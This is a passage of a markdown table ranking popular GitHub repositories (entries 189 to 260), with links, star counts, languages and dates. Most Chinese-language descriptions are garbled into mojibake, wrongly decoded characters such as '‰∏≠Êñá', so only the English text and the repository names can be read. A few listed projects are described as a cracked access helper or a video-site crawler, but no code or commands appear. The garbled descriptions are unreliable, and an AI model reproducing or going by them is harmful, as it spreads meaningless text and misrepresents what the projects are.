|189|[sparanoid/chinese-copywriting-guidelines](https://github.com/sparanoid/chinese-copywriting-guidelines)|Chinese copywriting guidelines for better written communicationÔºè‰∏≠ÊñáÊñáÊ°àÊéíÁâàÊåáÂåó|8.5k|CoffeeScript|05/07|
|190|[halfrost/LeetCode-Go](https://github.com/halfrost/LeetCode-Go)|‚úÖ Solutions to LeetCode by Go, 100% test coverage, runtime beats 100% / LeetCode È¢òËß£|8.5k|Go|10/18|
|191|[paascloud/paascloud-master](https://github.com/paascloud/paascloud-master)|spring cloud + vue + oAuth2.0ÂÖ®ÂÆ∂Ê°∂ÂÆûÊàòÔºåÂâçÂêéÁ´ØÂàÜÁ¶ªÊ®°ÊãüÂïÜÂüéÔºåÂÆåÊï¥ÁöÑË¥≠Áâ©ÊµÅÁ®ã„ÄÅÂêéÁ´ØËøêËê•Âπ≥Âè∞ÔºåÂèØ‰ª•ÂÆûÁé∞Âø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÁ∫ßÂæÆÊúçÂä°È°πÁõÆ„ÄÇÊîØÊåÅÂæÆ‰ø°ÁôªÂΩïÁ≠â‰∏âÊñπÁôªÂΩï„ÄÇ|8.5k|Java|07/02|
|192|[zhisheng17/flink-learning](https://github.com/zhisheng17/flink-learning)|flink learning blog. http://www.flink-learning.com  Âê´ Flink ÂÖ•Èó®„ÄÅÊ¶ÇÂøµ„ÄÅÂéüÁêÜ„ÄÅÂÆûÊàò„ÄÅÊÄßËÉΩË∞É‰ºò„ÄÅÊ∫êÁ†ÅËß£ÊûêÁ≠âÂÜÖÂÆπ„ÄÇÊ∂âÂèä Flink Connector„ÄÅMetrics„ÄÅLibrary„ÄÅDataStream API„ÄÅTable API & SQL Á≠âÂÜÖÂÆπÁöÑÂ≠¶‰π†Ê°à‰æãÔºåËøòÊúâ Flink ËêΩÂú∞Â∫îÁî®ÁöÑÂ§ßÂûãÈ°πÁõÆÊ°à‰æãÔºàPVUV„ÄÅÊó•ÂøóÂ≠òÂÇ®„ÄÅÁôæ‰∫øÊï∞ÊçÆÂÆûÊó∂ÂéªÈáç„ÄÅÁõëÊéßÂëäË≠¶ÔºâÂàÜ‰∫´„ÄÇÊ¨¢ËøéÂ§ßÂÆ∂ÊîØÊåÅÊàëÁöÑ‰∏ìÊ†è„ÄäÂ§ßÊï∞ÊçÆÂÆûÊó∂ËÆ°ÁÆóÂºïÊìé Flink ÂÆûÊàò‰∏éÊÄßËÉΩ‰ºòÂåñ„Äã|8.4k|Java|10/17|
|193|[stanzhai/be-a-professional-programmer](https://github.com/stanzhai/be-a-professional-programmer)|Êàê‰∏∫‰∏ì‰∏öÁ®ãÂ∫èÂëòË∑Ø‰∏äÁî®Âà∞ÁöÑÂêÑÁßç‰ºòÁßÄËµÑÊñô„ÄÅÁ•ûÂô®ÂèäÊ°ÜÊû∂|8.4k|-|07/16|
|194|[bailicangdu/vue2-happyfri](https://github.com/bailicangdu/vue2-happyfri)|vue2 + vue-router + vuex  ÂÖ•Èó®È°πÁõÆ|8.4k|JavaScript|08/11|
|195|[chokcoco/iCSS](https://github.com/chokcoco/iCSS)|‰∏çÊ≠¢‰∫é CSS|8.3k|-|10/29|
|196|[hyb1996/Auto.js](https://github.com/hyb1996/Auto.js)|A UiAutomator on android, does not need root access(ÂÆâÂçìÂπ≥Âè∞‰∏äÁöÑJavaScriptËá™Âä®ÂåñÂ∑•ÂÖ∑)|8.3k|Java|10/07|
|197|[trazyn/ieaseMusic](https://github.com/trazyn/ieaseMusic)|ÁΩëÊòì‰∫ëÈü≥‰πêÁ¨¨‰∏âÊñπ|8.3k|JavaScript|07/07|
|198|[lihengming/spring-boot-api-project-seed](https://github.com/lihengming/spring-boot-api-project-seed)|:seedling::rocket:‰∏Ä‰∏™Âü∫‰∫éSpring Boot & MyBatisÁöÑÁßçÂ≠êÈ°πÁõÆÔºåÁî®‰∫éÂø´ÈÄüÊûÑÂª∫‰∏≠Â∞èÂûãAPI„ÄÅRESTful APIÈ°πÁõÆ~|8.3k|Java|10/22|
|199|[talkgo/night](https://github.com/talkgo/night)|Weekly Go Online Meetup via BilibiliÔΩúGo Â§úËØªÔΩúÁî± SIG ÊàêÂëòÁª¥Êä§ÔΩúÈÄöËøá bilibili Âú®Á∫øÁõ¥Êí≠ÁöÑÊñπÂºèÂàÜ‰∫´ Go Áõ∏ÂÖ≥ÁöÑÊäÄÊúØËØùÈ¢òÔºåÊØèÂ§©Â§ßÂÆ∂Âú®ÂæÆ‰ø°/telegram/Slack ‰∏äÂèäÊó∂Ê≤üÈÄö‰∫§ÊµÅÁºñÁ®ãÊäÄÊúØËØùÈ¢ò„ÄÇ|8.3k|Go|10/20|
|200|[GitHubDaily/GitHubDaily](https://github.com/GitHubDaily/GitHubDaily)|GitHubDaily ÂàÜ‰∫´ÂÜÖÂÆπÂÆöÊúüÊï¥ÁêÜ‰∏éÂàÜÁ±ª„ÄÇÊ¨¢ËøéÊé®Ëçê„ÄÅËá™ËçêÈ°πÁõÆÔºåËÆ©Êõ¥Â§ö‰∫∫Áü•ÈÅì‰Ω†ÁöÑÈ°πÁõÆ„ÄÇ|8.2k|-|07/10|
|201|[YunaiV/SpringBoot-Labs](https://github.com/YunaiV/SpringBoot-Labs)|‰∏Ä‰∏™Ê∂µÁõñÂÖ≠‰∏™‰∏ìÊ†èÔºöSpring Boot 2.X„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅDubbo„ÄÅÂàÜÂ∏ÉÂºèÊ∂àÊÅØÈòüÂàó„ÄÅÂàÜÂ∏ÉÂºè‰∫ãÂä°ÁöÑ‰ªìÂ∫ì„ÄÇÂ∏åÊúõËÉñÂèãÂ∞èÊâã‰∏ÄÊäñÔºåÂè≥‰∏äËßíÊù•‰∏™ StarÔºåÊÑüÊÅ© 1024|8.2k|Java|10/23|
|202|[toutiaoio/awesome-architecture](https://github.com/toutiaoio/awesome-architecture)|Êû∂ÊûÑÂ∏àÊäÄÊúØÂõæË∞±ÔºåÂä©‰Ω†Êó©Êó•Êàê‰∏∫Êû∂ÊûÑÂ∏à|8.2k|-|10/29|
|203|[APIJSON/APIJSON](https://github.com/APIJSON/APIJSON)|üèÜÁ†Å‰∫ëÊúÄÊúâ‰ª∑ÂÄºÂºÄÊ∫êÈ°πÁõÆ üöÄÂêéÁ´ØÊé•Âè£ÂíåÊñáÊ°£Ëá™Âä®ÂåñÔºåÂâçÁ´Ø(ÂÆ¢Êà∑Á´Ø) ÂÆöÂà∂ËøîÂõû JSON ÁöÑÊï∞ÊçÆÂíåÁªìÊûÑÔºÅüèÜGitee Most Valuable Project üöÄA JSON Transmission Protocol and an ORM Library for automatically providing APIs and Docs.|8.2k|Java|10/27|
|204|[heibaiying/BigData-Notes](https://github.com/heibaiying/BigData-Notes)|Â§ßÊï∞ÊçÆÂÖ•Èó®ÊåáÂçó  :star:|8.2k|Java|10/20|
|205|[zhaoolee/ChineseBQB](https://github.com/zhaoolee/ChineseBQB)|üá®üá≥ Chinese sticker pack,More joy / Ë°®ÊÉÖÂåÖÁöÑÂçöÁâ©È¶Ü, GithubÊúÄÊúâÊØíÁöÑ‰ªìÂ∫ì, ‰∏≠ÂõΩË°®ÊÉÖÂåÖÂ§ßÈõÜÂêà, ËÅöÊ¨¢‰πê~|8.2k|JavaScript|10/12|
|206|[hackware1993/MagicIndicator](https://github.com/hackware1993/MagicIndicator)|A powerful, customizable and extensible ViewPager indicator framework. As the best alternative of ViewPagerIndicator, TabLayout and PagerSlidingTabStrip   ‚Äî‚Äî   Âº∫Â§ß„ÄÅÂèØÂÆöÂà∂„ÄÅÊòìÊâ©Â±ïÁöÑ ViewPager ÊåáÁ§∫Âô®Ê°ÜÊû∂„ÄÇÊòØViewPagerIndicator„ÄÅTabLayout„ÄÅPagerSlidingTabStripÁöÑÊúÄ‰Ω≥Êõø‰ª£ÂìÅ„ÄÇÊîØÊåÅËßíÊ†áÔºåÊõ¥ÊîØÊåÅÂú®ÈùûViewPagerÂú∫ÊôØ‰∏ã‰ΩøÁî®Ôºà‰ΩøÁî®hide()„ÄÅshow()ÂàáÊç¢FragmentÊàñ‰ΩøÁî®se ...|8.2k|Java|09/29|
|207|[chenyuntc/pytorch-book](https://github.com/chenyuntc/pytorch-book)|PyTorch tutorials and fun projects including neural talk, neural style, poem writing, anime generation („ÄäÊ∑±Â∫¶Â≠¶‰π†Ê°ÜÊû∂PyTorchÔºöÂÖ•Èó®‰∏éÂÆûÊàò„Äã)|8.1k|Jupyter Notebook|07/14|
|208|[EtherDream/jsproxy](https://github.com/EtherDream/jsproxy)|‰∏Ä‰∏™Âü∫‰∫éÊµèËßàÂô®Á´Ø JS ÂÆûÁé∞ÁöÑÂú®Á∫ø‰ª£ÁêÜ|8.0k|Shell|05/08|
|209|[star7th/showdoc](https://github.com/star7th/showdoc)|ShowDoc is a tool greatly applicable for an IT team to share documents online‰∏Ä‰∏™ÈùûÂ∏∏ÈÄÇÂêàITÂõ¢ÈòüÁöÑÂú®Á∫øAPIÊñáÊ°£„ÄÅÊäÄÊúØÊñáÊ°£Â∑•ÂÖ∑|8.0k|JavaScript|10/24|
|210|[fangzesheng/free-api](https://github.com/fangzesheng/free-api)|Êî∂ÈõÜÂÖçË¥πÁöÑÊé•Âè£ÊúçÂä°,ÂÅö‰∏Ä‰∏™apiÁöÑÊê¨ËøêÂ∑•|8.0k|-|10/11|
|211|[Embedding/Chinese-Word-Vectors](https://github.com/Embedding/Chinese-Word-Vectors)|100+ Chinese Word Vectors ‰∏äÁôæÁßçÈ¢ÑËÆ≠ÁªÉ‰∏≠ÊñáËØçÂêëÈáè |8.0k|Python|08/24|
|212|[didi/chameleon](https://github.com/didi/chameleon)|ü¶é ‰∏ÄÂ•ó‰ª£Á†ÅËøêË°åÂ§öÁ´ØÔºå‰∏ÄÁ´ØÊâÄËßÅÂç≥Â§öÁ´ØÊâÄËßÅ|7.9k|JavaScript|09/21|
|213|[dxcweb/high-speed-downloader](https://github.com/dxcweb/high-speed-downloader)|Â∑≤‰∏çÂÜçÁª¥Êä§|7.9k|-|04/16|
|214|[flutterchina/flutter-in-action](https://github.com/flutterchina/flutter-in-action)|„ÄäFlutterÂÆûÊàò„ÄãÁîµÂ≠ê‰π¶|7.8k|HTML|09/28|
|215|[sfyc23/EverydayWechat](https://github.com/sfyc23/EverydayWechat)|ÂæÆ‰ø°Âä©ÊâãÔºö1.ÊØèÊó•ÂÆöÊó∂ÁªôÂ•ΩÂèãÔºàÂ•≥ÂèãÔºâÂèëÈÄÅÂÆöÂà∂Ê∂àÊÅØ„ÄÇ2.Êú∫Âô®‰∫∫Ëá™Âä®ÂõûÂ§çÂ•ΩÂèã„ÄÇ3.Áæ§Âä©ÊâãÂäüËÉΩÔºà‰æãÂ¶ÇÔºöÊü•ËØ¢ÂûÉÂúæÂàÜÁ±ª„ÄÅÂ§©Ê∞î„ÄÅÊó•ÂéÜ„ÄÅÁîµÂΩ±ÂÆûÊó∂Á•®Êàø„ÄÅÂø´ÈÄíÁâ©ÊµÅ„ÄÅPM2.5Á≠âÔºâ|7.7k|Python|09/28|
|216|[rootsongjc/kubernetes-handbook](https://github.com/rootsongjc/kubernetes-handbook)|Kubernetes‰∏≠ÊñáÊåáÂçó/‰∫ëÂéüÁîüÂ∫îÁî®Êû∂ÊûÑÂÆûË∑µÊâãÂÜå -  https://jimmysong.io/kubernetes-handbook|7.7k|Shell|10/10|
|217|[sylnsfar/qrcode](https://github.com/sylnsfar/qrcode)|artistic QR Code in Python ÔºàAnimated GIF qr codeÔºâ- Python Ëâ∫ÊúØ‰∫åÁª¥Á†ÅÁîüÊàêÂô® ÔºàGIFÂä®ÊÄÅ‰∫åÁª¥Á†Å„ÄÅÂõæÁâá‰∫åÁª¥Á†ÅÔºâ|7.7k|Python|10/25|
|218|[Light-City/CPlusPlusThings](https://github.com/Light-City/CPlusPlusThings)|C++ÈÇ£‰∫õ‰∫ã|7.7k|C++|10/18|
|219|[haotian-wang/google-access-helper](https://github.com/haotian-wang/google-access-helper)|Ë∞∑Ê≠åËÆøÈóÆÂä©ÊâãÁ†¥Ëß£Áâà|7.6k|JavaScript|04/04|
|220|[hackstoic/golang-open-source-projects](https://github.com/hackstoic/golang-open-source-projects)|‰∏∫‰∫íËÅîÁΩëIT‰∫∫ÊâìÈÄ†ÁöÑ‰∏≠ÊñáÁâàawesome-go|7.6k|-|10/17|
|221|[TwoWater/Python](https://github.com/TwoWater/Python)|ÊúÄËâØÂøÉÁöÑ Python ÊïôÁ®ãÔºö|7.6k|-|10/19|
|222|[DeathKing/Learning-SICP](https://github.com/DeathKing/Learning-SICP)|MITËßÜÈ¢ëÂÖ¨ÂºÄËØæ„ÄäËÆ°ÁÆóÊú∫Á®ãÂ∫èÁöÑÊûÑÈÄ†ÂíåËß£Èáä„Äã‰∏≠ÊñáÂåñÈ°πÁõÆÂèäËØæÁ®ãÂ≠¶‰π†ËµÑÊñôÊêúÈõÜ„ÄÇ|7.6k|Ruby|02/25|
|223|[evil-huawei/evil-huawei](https://github.com/evil-huawei/evil-huawei)|Evil Huawei - Âçé‰∏∫‰ΩúËøáÁöÑÊÅ∂|7.6k|JavaScript|08/03|
|224|[hoochanlon/w3-goto-world](https://github.com/hoochanlon/w3-goto-world)|üçÖGit/AWS/Google ÈïúÂÉè ,SS/SSR/VMESSËäÇÁÇπ,WireGuard,IPFS, DeepWeb,Capitalism Áü•ËØÜÂÇ®Â§áÂ∫ì|7.6k|Python|10/26|
|225|[mzlogin/awesome-adb](https://github.com/mzlogin/awesome-adb)|ADB Usage Complete / ADB Áî®Ê≥ïÂ§ßÂÖ®|7.6k|-|08/17|
|226|[top-think/think](https://github.com/top-think/think)|ThinkPHP Framework ‚Äî‚ÄîÂçÅÂπ¥Âå†ÂøÉÁöÑÈ´òÊÄßËÉΩPHPÊ°ÜÊû∂|7.6k|PHP|10/27|
|227|[thinkgem/jeesite](https://github.com/thinkgem/jeesite)|JeeSite ÊòØ‰∏Ä‰∏™‰ºÅ‰∏ö‰ø°ÊÅØÂåñÂºÄÂèëÂü∫Á°ÄÂπ≥Âè∞ÔºåJava‰ºÅ‰∏öÂ∫îÁî®ÂºÄÊ∫êÊ°ÜÊû∂ÔºåJava EEÔºàJ2EEÔºâÂø´ÈÄüÂºÄÂèëÊ°ÜÊû∂Ôºå‰ΩøÁî®ÁªèÂÖ∏ÊäÄÊúØÁªÑÂêàÔºàSpring„ÄÅSpring MVC„ÄÅApache Shiro„ÄÅMyBatis„ÄÅBootstrap UIÔºâÔºåÂåÖÊã¨Ê†∏ÂøÉÊ®°ÂùóÂ¶ÇÔºöÁªÑÁªáÊú∫ÊûÑ„ÄÅËßíËâ≤Áî®Êà∑„ÄÅÊùÉÈôêÊéàÊùÉ„ÄÅÊï∞ÊçÆÊùÉÈôê„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÂ∑•‰ΩúÊµÅÁ≠â„ÄÇ|7.5k|JavaScript|10/08|
|228|[icindy/wxParse](https://github.com/icindy/wxParse)|wxParse-ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂØåÊñáÊú¨Ëß£ÊûêËá™ÂÆö‰πâÁªÑ‰ª∂ÔºåÊîØÊåÅHTMLÂèämarkdownËß£Êûê|7.5k|JavaScript|03/19|
|229|[pwxcoo/chinese-xinhua](https://github.com/pwxcoo/chinese-xinhua)|:orange_book: ‰∏≠ÂçéÊñ∞ÂçéÂ≠óÂÖ∏Êï∞ÊçÆÂ∫ì„ÄÇÂåÖÊã¨Ê≠áÂêéËØ≠ÔºåÊàêËØ≠ÔºåËØçËØ≠ÔºåÊ±âÂ≠ó„ÄÇ|7.4k|Python|10/18|
|230|[nusr/hacker-laws-zh](https://github.com/nusr/hacker-laws-zh)|üíªüìñÂØπÂºÄÂèë‰∫∫ÂëòÊúâÁî®ÁöÑÂÆöÂæã„ÄÅÁêÜËÆ∫„ÄÅÂéüÂàôÂíåÊ®°Âºè„ÄÇ(Laws, Theories, Principles and Patterns that developers will find useful.)|7.4k|-|10/29|
|231|[opendigg/awesome-github-wechat-weapp](https://github.com/opendigg/awesome-github-wechat-weapp)|ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÂºÄÊ∫êÈ°πÁõÆÂ∫ìÊ±áÊÄª|7.4k|-|08/16|
|232|[hs-web/hsweb-framework](https://github.com/hs-web/hsweb-framework)|hsweb (ha äs w…õb) ÊòØ‰∏Ä‰∏™Áî®‰∫éÂø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂü∫Á°ÄÈ°πÁõÆ,ÈõÜÊàê‰∏ÄÊèΩÂ≠ê‰æøÊç∑ÂäüËÉΩÂ¶Ç:‰æøÊç∑ÁöÑÈÄöÁî®Â¢ûÂà†ÊîπÊü•,Âº∫Â§ßÁöÑÊùÉÈôêÁÆ°ÁêÜ,Âä®ÊÄÅÂ§öÊï∞ÊçÆÊ∫ê,Âä®ÊÄÅË°®Âçï,Âú®Á∫øÊï∞ÊçÆÂ∫ìÁª¥Êä§Á≠â. Âü∫‰∫é spring-boot,mybaits.|7.4k|Java|10/29|
|233|[banchichen/TZImagePickerController](https://github.com/banchichen/TZImagePickerController)|‰∏Ä‰∏™ÊîØÊåÅÂ§öÈÄâ„ÄÅÈÄâÂéüÂõæÂíåËßÜÈ¢ëÁöÑÂõæÁâáÈÄâÊã©Âô®ÔºåÂêåÊó∂ÊúâÈ¢ÑËßà„ÄÅË£ÅÂâ™ÂäüËÉΩÔºåÊîØÊåÅiOS6+„ÄÇ  A clone of UIImagePickerController, support picking multiple photos„ÄÅoriginal photo„ÄÅvideo, also allow preview photo and video, support iOS6+|7.4k|Objective-C|10/29|
|234|[vipstone/faceai](https://github.com/vipstone/faceai)|‰∏ÄÊ¨æÂÖ•Èó®Á∫ßÁöÑ‰∫∫ËÑ∏„ÄÅËßÜÈ¢ë„ÄÅÊñáÂ≠óÊ£ÄÊµã‰ª•ÂèäËØÜÂà´ÁöÑÈ°πÁõÆ.|7.3k|Python|04/16|
|235|[guyueyingmu/avbook](https://github.com/guyueyingmu/avbook)|AV ÁîµÂΩ±ÁÆ°ÁêÜÁ≥ªÁªüÔºå avmoo , javbus , javlibrary Áà¨Ëô´ÔºåÁ∫ø‰∏ä AV ÂΩ±ÁâáÂõæ‰π¶È¶ÜÔºåAV Á£ÅÂäõÈìæÊé•Êï∞ÊçÆÂ∫ìÔºåJapanese Adult Video Library,Adult Video Magnet Links - Japanese Adult Video Database|7.3k|PHP|10/01|
|236|[judasn/Linux-Tutorial](https://github.com/judasn/Linux-Tutorial)|„ÄäJava Á®ãÂ∫èÂëòÁúº‰∏≠ÁöÑ Linux„Äã|7.3k|Shell|10/27|
|237|[DuGuQiuBai/Java](https://github.com/DuGuQiuBai/Java)|27Â§©Êàê‰∏∫JavaÂ§ßÁ•û|7.3k|Java|10/18|
|238|[ruanyf/document-style-guide](https://github.com/ruanyf/document-style-guide)|‰∏≠ÊñáÊäÄÊúØÊñáÊ°£ÁöÑÂÜô‰ΩúËßÑËåÉ|7.3k|-|07/23|
|239|[wangshub/Douyin-Bot](https://github.com/wangshub/Douyin-Bot)|üòç Python ÊäñÈü≥Êú∫Âô®‰∫∫ÔºåËÆ∫Â¶Ç‰ΩïÂú®ÊäñÈü≥‰∏äÊâæÂà∞ÊºÇ‰∫ÆÂ∞èÂßêÂßêÔºü |7.2k|Python|05/07|
|240|[polaris1119/The-Golang-Standard-Library-by-Example](https://github.com/polaris1119/The-Golang-Standard-Library-by-Example)|GolangÊ†áÂáÜÂ∫ì„ÄÇÂØπ‰∫éÁ®ãÂ∫èÂëòËÄåË®ÄÔºåÊ†áÂáÜÂ∫ì‰∏éËØ≠Ë®ÄÊú¨Ë∫´ÂêåÊ†∑ÈáçË¶ÅÔºåÂÆÉÂ•ΩÊØî‰∏Ä‰∏™ÁôæÂÆùÁÆ±ÔºåËÉΩ‰∏∫ÂêÑÁßçÂ∏∏ËßÅÁöÑ‰ªªÂä°Êèê‰æõÂÆåÁæéÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ‰ª•Á§∫‰æãÈ©±Âä®ÁöÑÊñπÂºèËÆ≤Ëß£GolangÁöÑÊ†áÂáÜÂ∫ì„ÄÇ|7.2k|Go|07/22|
|241|[macrozheng/mall-admin-web](https://github.com/macrozheng/mall-admin-web)|mall-admin-webÊòØ‰∏Ä‰∏™ÁîµÂïÜÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂâçÁ´ØÈ°πÁõÆÔºåÂü∫‰∫éVue+ElementÂÆûÁé∞„ÄÇ ‰∏ªË¶ÅÂåÖÊã¨ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÂäüËÉΩ„ÄÇ|7.2k|Vue|10/08|
|242|[PanDownloadServer/Server](https://github.com/PanDownloadServer/Server)|PanDownloadÁöÑ‰∏™‰∫∫Áª¥Êä§ÁâàÊú¨|7.1k|HTML|09/25|
|243|[eip-work/kuboard-press](https://github.com/eip-work/kuboard-press)|Kuboard ÊòØÂü∫‰∫é Kubernetes ÁöÑÂæÆÊúçÂä°ÁÆ°ÁêÜÁïåÈù¢„ÄÇÂêåÊó∂Êèê‰æõ Kubernetes ÂÖçË¥π‰∏≠ÊñáÊïôÁ®ãÔºåÂÖ•Èó®ÊïôÁ®ãÔºåÊúÄÊñ∞ÁâàÊú¨ÁöÑ Kubernetes v1.18 ÂÆâË£ÖÊâãÂÜåÔºå(k8s install) Âú®Á∫øÁ≠îÁñëÔºåÊåÅÁª≠Êõ¥Êñ∞„ÄÇ|7.1k|JavaScript|10/29|
|244|[macrozheng/mall-learning](https://github.com/macrozheng/mall-learning)|mallÂ≠¶‰π†ÊïôÁ®ãÔºåÊû∂ÊûÑ„ÄÅ‰∏öÂä°„ÄÅÊäÄÊúØË¶ÅÁÇπÂÖ®Êñπ‰ΩçËß£Êûê„ÄÇmallÈ°πÁõÆÔºà39k+starÔºâÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºå‰ΩøÁî®Áé∞Èò∂ÊÆµ‰∏ªÊµÅÊäÄÊúØÂÆûÁé∞„ÄÇÊ∂µÁõñ‰∫ÜSpringBoot 2.3.0„ÄÅMyBatis 3.4.6„ÄÅElasticsearch 7.6.2„ÄÅRabbitMQ 3.7.15„ÄÅRedis 5.0„ÄÅMongoDB 4.2.5„ÄÅMysql5.7Á≠âÊäÄÊúØÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ|7.1k|Java|10/28|
|245|[huanghaibin-dev/CalendarView](https://github.com/huanghaibin-dev/CalendarView)|Android‰∏ä‰∏Ä‰∏™‰ºòÈõÖ„ÄÅ‰∏áËÉΩËá™ÂÆö‰πâUI„ÄÅÊîØÊåÅÂë®ËßÜÂõæ„ÄÅËá™ÂÆö‰πâÂë®Ëµ∑Âßã„ÄÅÊÄßËÉΩÈ´òÊïàÁöÑÊó•ÂéÜÊéß‰ª∂ÔºåÊîØÊåÅÁÉ≠ÊèíÊãîÂÆûÁé∞ÁöÑUIÂÆöÂà∂ÔºÅÊîØÊåÅÊ†áËÆ∞„ÄÅËá™ÂÆö‰πâÈ¢úËâ≤„ÄÅÂÜúÂéÜ„ÄÅËá™ÂÆö‰πâÊúàËßÜÂõæÂêÑÁßçÊòæÁ§∫Ê®°ÂºèÁ≠â„ÄÇCanvasÁªòÂà∂ÔºåÈÄüÂ∫¶Âø´„ÄÅÂç†Áî®ÂÜÖÂ≠ò‰ΩéÔºå‰Ω†ÁúüÁöÑÊÉ≥‰∏çÂà∞Êó•ÂéÜÂ±ÖÁÑ∂ËøòÂèØ‰ª•Â¶ÇÊ≠§‰ºòÈõÖÔºÅAn elegant, highly customized and high-performance Calendar Widget on Android.|7.1k|Java|09/16|
|246|[xcatliu/typescript-tutorial](https://github.com/xcatliu/typescript-tutorial)|TypeScript ÂÖ•Èó®ÊïôÁ®ã|7.1k|TypeScript|10/21|
|247|[wsdjeg/vim-galore-zh_cn](https://github.com/wsdjeg/vim-galore-zh_cn)|Vim ‰ªéÂÖ•Èó®Âà∞Á≤æÈÄö|7.0k|Vim script|09/19|
|248|[crawlab-team/crawlab](https://github.com/crawlab-team/crawlab)|Distributed web crawler admin platform for spiders management regardless of languages and frameworks. ÂàÜÂ∏ÉÂºèÁà¨Ëô´ÁÆ°ÁêÜÂπ≥Âè∞ÔºåÊîØÊåÅ‰ªª‰ΩïËØ≠Ë®ÄÂíåÊ°ÜÊû∂|7.0k|Go|10/29|
|249|[helloqingfeng/Awsome-Front-End-learning-resource](https://github.com/helloqingfeng/Awsome-Front-End-learning-resource)|:octocat:GitHubÊúÄÂÖ®ÁöÑÂâçÁ´ØËµÑÊ∫êÊ±áÊÄª‰ªìÂ∫ìÔºàÂåÖÊã¨ÂâçÁ´ØÂ≠¶‰π†„ÄÅÂºÄÂèëËµÑÊ∫ê„ÄÅÊ±ÇËÅåÈù¢ËØïÁ≠âÔºâ|7.0k|PHP|08/28|
|250|[bingoogolapple/BGAQRCode-Android](https://github.com/bingoogolapple/BGAQRCode-Android)|QRCode Êâ´Êèè‰∫åÁª¥Á†Å„ÄÅÊâ´ÊèèÊù°ÂΩ¢Á†Å„ÄÅÁõ∏ÂÜåËé∑ÂèñÂõæÁâáÂêéËØÜÂà´„ÄÅÁîüÊàêÂ∏¶ Logo ‰∫åÁª¥Á†Å„ÄÅÊîØÊåÅÂæÆÂçöÂæÆ‰ø° QQ ‰∫åÁª¥Á†ÅÊâ´ÊèèÊ†∑Âºè|6.9k|C|07/11|
|251|[crossoverJie/cim](https://github.com/crossoverJie/cim)|üì≤cim(cross IM) ÈÄÇÁî®‰∫éÂºÄÂèëËÄÖÁöÑÂàÜÂ∏ÉÂºèÂç≥Êó∂ÈÄöËÆØÁ≥ªÁªü|6.9k|Java|10/13|
|252|[bailicangdu/react-pxq](https://github.com/bailicangdu/react-pxq)|‰∏Ä‰∏™ react + redux ÁöÑÂÆåÊï¥È°πÁõÆ Âíå ‰∏™‰∫∫ÊÄªÁªì|6.9k|JavaScript|08/11|
|253|[inferjay/AndroidDevTools](https://github.com/inferjay/AndroidDevTools)|Êî∂ÈõÜÊï¥ÁêÜAndroidÂºÄÂèëÊâÄÈúÄÁöÑAndroid SDK„ÄÅÂºÄÂèë‰∏≠Áî®Âà∞ÁöÑÂ∑•ÂÖ∑„ÄÅAndroidÂºÄÂèëÊïôÁ®ã„ÄÅAndroidËÆæËÆ°ËßÑËåÉÔºåÂÖçË¥πÁöÑËÆæËÆ°Á¥†ÊùêÁ≠â„ÄÇ|6.9k|-|10/30|
|254|[zh-google-styleguide/zh-google-styleguide](https://github.com/zh-google-styleguide/zh-google-styleguide)|Google ÂºÄÊ∫êÈ°πÁõÆÈ£éÊ†ºÊåáÂçó (‰∏≠ÊñáÁâà)|6.9k|Makefile|10/29|
|255|[xirong/my-git](https://github.com/xirong/my-git)|Individual collecting material of learning gitÔºàÊúâÂÖ≥ git ÁöÑÂ≠¶‰π†ËµÑÊñôÔºâ|6.8k|-|07/12|
|256|[halfrost/Halfrost-Field](https://github.com/halfrost/Halfrost-Field)|‚úçüèª ËøôÈáåÊòØÂÜôÂçöÂÆ¢ÁöÑÂú∞Êñπ ‚Äî‚Äî Halfrost-Field ÂÜ∞Èúú‰πãÂú∞|6.8k|Objective-C|09/20|
|257|[huangz1990/redis-3.0-annotated](https://github.com/huangz1990/redis-3.0-annotated)|Â∏¶ÊúâËØ¶ÁªÜÊ≥®ÈáäÁöÑ Redis 3.0 ‰ª£Á†ÅÔºàannotated Redis 3.0 source codeÔºâ„ÄÇ|6.8k|C|04/23|
|258|[NLP-LOVE/ML-NLP](https://github.com/NLP-LOVE/ML-NLP)|Ê≠§È°πÁõÆÊòØÊú∫Âô®Â≠¶‰π†(Machine Learning)„ÄÅÊ∑±Â∫¶Â≠¶‰π†(Deep Learning)„ÄÅNLPÈù¢ËØï‰∏≠Â∏∏ËÄÉÂà∞ÁöÑÁü•ËØÜÁÇπÂíå‰ª£Á†ÅÂÆûÁé∞Ôºå‰πüÊòØ‰Ωú‰∏∫‰∏Ä‰∏™ÁÆóÊ≥ïÂ∑•Á®ãÂ∏àÂøÖ‰ºöÁöÑÁêÜËÆ∫Âü∫Á°ÄÁü•ËØÜ„ÄÇ|6.8k|Jupyter Notebook|04/20|
|259|[fuck-xuexiqiangguo/Fuck-XueXiQiangGuo](https://github.com/fuck-xuexiqiangguo/Fuck-XueXiQiangGuo)|Â≠¶‰π†Âº∫ÂõΩ Êáí‰∫∫Âà∑ÂàÜÂ∑•ÂÖ∑ Ëá™Âä®Â≠¶‰π†|6.8k|-|05/17|
|260|[greatghoul/remote-working](https://github.com/greatghoul/remote-working)|Êî∂ÈõÜÊï¥ÁêÜËøúÁ®ãÂ∑•‰ΩúÁõ∏ÂÖ≥ÁöÑËµÑÊñô|6.7k|Ruby|10/25|
